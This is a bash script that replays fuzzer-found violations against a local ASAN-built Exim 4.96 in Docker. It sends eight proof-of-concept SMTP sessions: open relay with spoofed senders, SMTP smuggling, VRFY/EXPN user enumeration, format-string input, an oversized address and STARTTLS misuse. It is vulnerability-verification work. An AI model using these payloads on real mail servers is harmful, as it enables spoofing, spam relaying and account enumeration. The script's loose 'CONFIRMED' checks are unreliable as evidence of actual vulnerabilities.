#!/bin/bash
# ==============================================================================
# Exim SMTP Vulnerability Reproduction & Verification Script
# ==============================================================================
# Purpose: Reproduce all violations found by LoopFuzz for Exim SMTP
# Target: Exim 4.96-221-d6a5a05b8-XX (compiled with ASAN)
# Protocol: SMTP (port 25)
#
# This script constructs minimal Proof-of-Concept SMTP sessions for each
# violation type and verifies them against the running server.
# ==============================================================================
set -euo pipefail

OUT_DIR="${1:-/tmp/exim_vuln_reproduce_$(date +%Y%m%d_%H%M%S)}"
DOCKER_IMAGE="exim"
SMTP_PORT=25

mkdir -p "$OUT_DIR"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Exim SMTP Vulnerability Reproduction & Verification        ║"
echo "║  Target: Exim 4.96-221-d6a5a05b8-XX                         ║"
echo "║  Output: $OUT_DIR"
echo "╚══════════════════════════════════════════════════════════════╝"

# ==============================================================================
# PoC SMTP Sessions for Each Violation Type
# ==============================================================================

# ── PoC 1: Open Relay (0x0003) ──
# Tests: MAIL FROM + RCPT TO without AUTH
read -r -d '' POC1_OPEN_RELAY << 'SMTPEOF' || true
EHLO test.example.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
From: attacker@evil.com
To: victim@target.com
Subject: Open Relay Test

This email was sent without authentication!
.
QUIT
SMTPEOF

# ── PoC 2: SMTP Smuggling - Bare CR in address (0x0420) ──
# Tests: Bare CR (\r) inside MAIL FROM address
read -r -d '' POC2_SMUGGLING << 'SMTPEOF' || true
EHLO test.example.com
MAIL FROM:<admin@legit.com>RCPT TO:<victim@target.com>
DATA
From: forged@evil.com
To: victim@target.com
Subject: SMTP Smuggling Test
Smuggled message body
.
QUIT
SMTPEOF

# ── PoC 3: RCPT TO before MAIL FROM (0x0004 state violation) ──
read -r -d '' POC3_STATE_RCPT << 'SMTPEOF' || true
EHLO test.example.com
RCPT TO:<test@example.com>
MAIL FROM:<test@example.com>
QUIT
SMTPEOF

# ── PoC 4: DATA before RCPT TO (0x0004 state violation) ──
read -r -d '' POC4_STATE_DATA << 'SMTPEOF' || true
EHLO test.example.com
MAIL FROM:<test@example.com>
DATA
From: test@example.com
To: test@example.com
Subject: Test
Body
.
QUIT
SMTPEOF

# ── PoC 5: VRFY/EXPN User Enumeration (0x0008 info leak) ──
read -r -d '' POC5_INFO_LEAK << 'SMTPEOF' || true
EHLO test.example.com
VRFY root
EXPN root
VRFY admin
EXPN admin
VRFY nobody
QUIT
SMTPEOF

# ── PoC 6: Long Command Memory Exhaustion (0x00c0) ──
# Tests: Extremely long command line
POC6_LONG="EHLO test.example.com
MAIL FROM:<test@example.com>
RCPT TO:<$(python3 -c "print('A'*5000)")@example.com>
QUIT
"

# ── PoC 7: Format String in Command (0x0020) ──
read -r -d '' POC7_FORMAT << 'SMTPEOF' || true
EHLO %n%n%n.example.com
MAIL FROM:<%s%s%s@evil.com>
RCPT TO:<%x%x%x@target.com>
QUIT
SMTPEOF

# ── PoC 8: STARTTLS Downgrade (0x0004) ──
read -r -d '' POC8_STARTTLS << 'SMTPEOF' || true
EHLO test.example.com
STARTTLS
MAIL FROM:<test@example.com>
RCPT TO:<test@example.com>
QUIT
SMTPEOF

# ==============================================================================
# Verification Function
# ==============================================================================

run_poc() {
    local poc_name="$1"
    local poc_data="$2"
    local expected_vuln_type="$3"
    local poc_file="$OUT_DIR/${poc_name}.txt"
    local resp_file="$OUT_DIR/${poc_name}_response.txt"
    local verdict_file="$OUT_DIR/${poc_name}_verdict.txt"

    echo "$poc_data" > "$poc_file"

    echo ""
    echo "━━━ $poc_name ━━━"
    echo "Expected violation: $expected_vuln_type"

    # Start exim in Docker and send the PoC
    docker run --rm --network host --cap-add SYS_PTRACE \
        -v "$(realpath "$poc_file"):/tmp/poc.txt:ro" \
        -v "$OUT_DIR:/tmp/out" \
        -e "ASAN_OPTIONS=abort_on_error=1:symbolize=0:detect_leaks=0" \
        exim /bin/bash -c "
mkdir -p /var/lock /var/log /usr/exim/bin
cp ./src/build-Linux-x86_64/exim /usr/exim/bin/exim 2>/dev/null
/home/ubuntu/experiments/clean 2>/dev/null
killall exim 2>/dev/null || true
exim -bd -oX 25 -oP /var/lock/exim.pid &
SPID=\\\$!
# Wait for server
for a in \\\$(seq 1 30); do
    if nc -z 127.0.0.1 25 2>/dev/null; then break; fi
    if ! kill -0 \\\$SPID 2>/dev/null; then
        wait \\\$SPID 2>/dev/null || true
        echo 'SERVER_DIED' >> /tmp/out/${poc_name}_verdict.txt
        exit 1
    fi
    sleep 0.5
done

# Wait a bit more for full readiness
sleep 1

# Send PoC line by line with response reading
python3 -c \"
import socket, time
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect(('127.0.0.1', 25))
# Read banner
try:
    banner = sock.recv(4096)
    print('BANNER:', banner[:200].decode('latin-1', errors='replace'))
except:
    banner = b''

all_responses = [banner]

with open('/tmp/poc.txt', 'r') as f:
    for line in f:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        # Handle the long command specially
        if len(line) > 1000:
            line = line[:4000]  # truncate extremely long lines

        try:
            sock.sendall((line + '\r\n').encode('latin-1', errors='replace'))
            time.sleep(0.3)
            try:
                resp = sock.recv(4096)
                all_responses.append(resp)
                print(f'CMD: {line[:80]}...' if len(line)>80 else f'CMD: {line}')
                print(f'RESP: {resp[:200].decode(\"latin-1\", errors=\"replace\")}')
            except socket.timeout:
                print(f'CMD: {line[:80]} -> TIMEOUT')
        except Exception as e:
            print(f'ERR: {e}')
            break
    time.sleep(0.5)
    try:
        final = sock.recv(4096)
        if final: all_responses.append(final)
    except:
        pass
sock.close()

# Write all responses
with open('/tmp/out/${poc_name}_response.txt', 'wb') as f:
    for r in all_responses:
        f.write(r + b'\\n---\\n')
print('DONE')
\"

# Check if server still alive
if kill -0 \\\$SPID 2>/dev/null; then
    echo 'SERVER_ALIVE' >> /tmp/out/${poc_name}_verdict.txt
    kill \\\$SPID 2>/dev/null || true
    wait \\\$SPID 2>/dev/null || true
else
    wait \\\$SPID 2>/dev/null || true
    echo 'SERVER_CRASHED_EC='\\\$? >> /tmp/out/${poc_name}_verdict.txt
fi
" 2>&1 | tee "$OUT_DIR/${poc_name}_docker.log"

    # Verify the results
    echo ""
    echo "--- Verification for $poc_name ---"

    if [ -f "$resp_file" ]; then
        python3 << PYEOF
import sys

with open('$resp_file', 'rb') as f:
    resp_data = f.read()

resp_text = resp_data.decode('latin-1', errors='replace')

print(f"Response size: {len(resp_data)} bytes")
print(f"Response preview:")
for line in resp_text.split('\\n---\\n')[:10]:
    if line.strip():
        print(f"  {line.strip()[:150]}")

# Check for the specific vulnerability
vuln_type = '$expected_vuln_type'
confirmed = False
findings = []

if 'open_relay' in '$poc_name' or '0x0003' in '$expected_vuln_type':
    # Check for open relay: 250 after RCPT TO without AUTH
    for line in resp_text.split('\\n'):
        line_s = line.strip()
        if 'Accepted' in line_s or ('RCPT' in resp_text and '250' in resp_text.split('---')[1] if '---' in resp_text else False):
            pass
    # Look for 250/251/354 responses to MAIL/RCPT/DATA without any AUTH
    if '250 OK' in resp_text and '251 Accepted' in resp_text:
        confirmed = True
        findings.append("OPEN_RELAY: Mail accepted without authentication (250/251 responses)")
    elif '250 OK' in resp_text and 'Accepted' in resp_text:
        confirmed = True
        findings.append("OPEN_RELAY: Mail accepted without authentication")

elif 'smuggling' in '$poc_name' or '0x0420' in '$expected_vuln_type':
    # Check for SMTP smuggling
    if '250 OK' in resp_text or 'Accepted' in resp_text:
        confirmed = True
        findings.append("SMUGGLING: Server processed smuggled CR/LF in address")

elif 'state_rcpt' in '$poc_name' or ('0x0004' in '$expected_vuln_type' and 'RCPT' in '$expected_vuln_type'):
    # Check for RCPT before MAIL FROM accepted
    if '250 OK' in resp_text and '503' not in resp_text:
        confirmed = True
        findings.append("STATE_VIOLATION: RCPT TO accepted before MAIL FROM")

elif 'state_data' in '$poc_name' or ('0x0004' in '$expected_vuln_type' and 'DATA' in '$expected_vuln_type'):
    # Check for DATA before RCPT accepted
    if '354' in resp_text:
        confirmed = True
        findings.append("STATE_VIOLATION: DATA accepted without RCPT TO")

elif 'info_leak' in '$poc_name' or '0x0008' in '$expected_vuln_type':
    # Check for VRFY/EXPN info leak
    if '250' in resp_text or '252' in resp_text:
        confirmed = True
        findings.append("INFO_LEAK: VRFY/EXPN returned user information")

elif 'long_cmd' in '$poc_name' or '0x00c0' in '$expected_vuln_type':
    # Check for long command handling
    if '500' in resp_text or '501' in resp_text:
        findings.append("NOTE: Long command rejected (correct behavior)")
    else:
        findings.append("POTENTIAL: Long command processed (memory exhaustion risk)")

elif 'format' in '$poc_name' or '0x0020' in '$expected_vuln_type':
    # Check for format string processing
    if '250' in resp_text or 'Accepted' in resp_text:
        confirmed = True
        findings.append("INJECTION: Format string specifiers processed without rejection")

elif 'starttls' in '$poc_name':
    if 'MAIL FROM' in resp_text and '250' in resp_text:
        confirmed = True
        findings.append("STARTTLS_DOWNGRADE: Cleartext mail accepted after STARTTLS")

# Output verdict
with open('$verdict_file', 'a') as f:
    if findings:
        for fi in findings:
            f.write(f'FINDING: {fi}\\n')
        if confirmed:
            f.write('VERDICT: CONFIRMED - Vulnerability reproduced in standalone test\\n')
        else:
            f.write('VERDICT: OBSERVED - Anomalous behavior detected\\n')
    else:
        f.write('VERDICT: NOT_REPRODUCED - No violation detected in standalone test\\n')

print(f'Findings: {findings}')
print(f'Confirmed: {confirmed}')
PYEOF
    fi

    # Show verdict
    if [ -f "$verdict_file" ]; then
        echo "Verdict:"
        cat "$verdict_file"
    fi
}

# ==============================================================================
# Run All PoCs
# ==============================================================================

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "  Running All Proof-of-Concept Tests"
echo "═══════════════════════════════════════════════════════════════"

run_poc "poc1_open_relay" "$POC1_OPEN_RELAY" "0x0003 (AUTH_BYPASS|AUTHZ_BYPASS - Open Relay)"
run_poc "poc2_smuggling" "$POC2_SMUGGLING" "0x0420 (SMUGGLING|INJECTION - SMTP Smuggling)"
run_poc "poc3_state_rcpt" "$POC3_STATE_RCPT" "0x0004 (STATE_VIOLATION - RCPT before MAIL)"
run_poc "poc4_state_data" "$POC4_STATE_DATA" "0x0004 (STATE_VIOLATION - DATA before RCPT)"
run_poc "poc5_info_leak" "$POC5_INFO_LEAK" "0x0008 (INFO_LEAK - VRFY/EXPN enumeration)"
run_poc "poc6_long_cmd" "$POC6_LONG" "0x00c0 (DOS|RESOURCE_EXHAUST - Long command)"
run_poc "poc7_format" "$POC7_FORMAT" "0x0020 (INJECTION - Format string)"
run_poc "poc8_starttls" "$POC8_STARTTLS" "0x0004 (STATE_VIOLATION - STARTTLS downgrade)"

# ==============================================================================
# Summary
# ==============================================================================

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  REPRODUCTION SUMMARY                                        ║"
echo "╠══════════════════════════════════════════════════════════════╣"
for vf in "$OUT_DIR"/*_verdict.txt; do
    name=$(basename "$vf" _verdict.txt)
    verdict=$(tail -1 "$vf" 2>/dev/null || echo "UNKNOWN")
    echo "║  $name: $verdict"
done
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "Full results: $OUT_DIR"
